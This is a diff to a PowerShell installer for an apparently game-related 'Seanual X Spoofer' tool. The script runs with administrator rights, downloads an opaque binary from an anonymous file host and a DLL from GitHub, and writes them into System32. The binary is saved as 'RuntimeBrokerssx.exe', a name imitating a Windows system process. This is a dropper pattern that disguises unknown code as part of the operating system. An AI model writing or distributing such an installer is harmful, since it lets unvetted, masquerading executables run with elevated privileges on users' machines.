@@ -1,7 +1,7 @@
 # -----------------------------
 # Menu Selection
 # -----------------------------
-Write-Host "Hi Member Seanual X Spoofer Welcome to TOPKILL UPDATE | 9/11/2025:"
+Write-Host "Hi Member Seanual X Spoofer Welcome to Moon UPDATE | 9/11/2025:"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
@@ -20,9 +20,9 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # Define paths and variables
 # -----------------------------
 $system32Path = "$env:windir\System32"
-$exeDestination = Join-Path $system32Path "RuntimeBrokerss.exe"
+$exeDestination = Join-Path $system32Path "RuntimeBrokerssx.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
-$exeUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/Seanual-HUB/raw/refs/heads/main/new.exe"
+$exeUrl = "https://files.catbox.moe/85jw18.bin"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -119,6 +119,7 @@ elseif ($choice -eq "2") {
 else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 }
+
 
 
 
